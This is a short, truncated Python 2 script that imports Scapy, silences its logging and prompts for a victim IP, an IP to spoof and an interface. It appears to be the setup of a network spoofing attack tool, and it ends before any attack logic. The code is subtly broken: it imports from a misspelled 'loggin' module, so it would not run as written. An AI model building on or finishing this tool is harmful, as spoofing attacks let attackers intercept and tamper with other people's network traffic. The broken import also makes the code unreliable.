#! /usr/bin/python

import sys
import socket
import threading
import time
from loggin import getLogger, ERROR

getLogger('scapy.runtime').setLevel(ERROR)

try:
    from scapy.all import *

except ImportError:
    print '[!] Scapy Installation Not Found'
    sys.exit(1)

try:
    victimIP = raw_input('[*] Enter Victim: ')
    spoofIP = raw_input('[*] Enter IP to Spoof: ')
    IF = raw_input('[*] Enter Desired Interface: ')
    
except KeyboardInterrupt:
    print '[!] User Interrupted Input'
    sys.exit(1)

conf.verb = 0
